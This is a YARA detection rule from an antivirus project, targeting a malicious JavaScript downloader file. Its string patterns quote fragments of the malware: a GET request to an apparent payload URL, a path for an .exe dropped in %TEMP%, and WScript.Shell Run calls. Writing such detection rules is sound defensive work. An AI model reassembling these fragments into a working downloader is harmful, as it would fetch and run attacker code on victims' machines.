rule sig_20160328_29098fe9caf626a1c4e6bd6a1be07fda {
  meta:
    description = "datamaliciousorder - file 20160328_29098fe9caf626a1c4e6bd6a1be07fda.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19d4152e6e9df1032980bfcb06dd638dfaea11855c1dbe582645a13b9e3dfe88"

  strings:
    $s1  = "function Btborl() {return Sfalwvou[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hivqKYBJKR8sycop.exe\";};" fullword ascii
    $s2  = "Pwqavc[Vhjhldx](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Vstucym](Oaolxm() * 11)} while (Pwqavc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Sfalwvou = function Aqewtzx() {return WScript[Iwjypon](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mhlgz(Kuypbo, Bmgbova){return Kuypbo - Bmgbova;};" fullword ascii
    $s6  = "function Ghmdp() {return ((Rvfiim == true) && (Rvfiim == Qvumtfbcrq)) ? 1 : Linuup;};" fullword ascii
    $s7  = "var Khppf = false;" fullword ascii
    $s8  = "function Mslnsrh(){return Gcozpdsm;};" fullword ascii
    $s9  = "function Oaolxm(){return 22;};" fullword ascii
    $s10 = "function Zltwvvv(){return Iwjypon;};" fullword ascii
    $s11 = "Rvfiim = true; " fullword ascii
    $s12 = "var Utcytdf = new this[\"Date\"]();" fullword ascii
    $s13 = "Qvumtfbcrq = true; " fullword ascii
    $s14 = "var Rvfiim = false;" fullword ascii
    $s15 = "return Mhlgz(Fbonnmk, Nlzuso);" fullword ascii
    $s16 = "var Qvumtfbcrq = false;" fullword ascii
    $s17 = "function Trmixi()" fullword ascii
    $s18 = " while (Jhvudwe){" fullword ascii
    $s19 = "function Iuwchzyaoc(Jnbcn) {var Rzuxvflqes = (1, 2, 3, 4, 5, Jnbcn); return Rzuxvflqes;};" fullword ascii
    $s20 = "function Tjfsyqnna(Azccanhlv){Sfalwvou[\"Run\"](Azccanhlv, Linuup, Linuup);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}